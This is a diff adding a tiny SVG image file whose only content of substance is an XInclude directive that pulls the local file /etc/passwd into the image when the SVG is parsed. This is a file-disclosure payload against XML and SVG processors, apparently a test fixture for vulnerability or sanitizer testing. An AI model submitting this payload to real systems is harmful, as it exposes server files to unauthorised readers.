@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xi="http://www.w3.org/2001/XInclude"
+     width="10" height="10">
+  <xi:include href="file:///etc/passwd" parse="text"/>
+</svg>
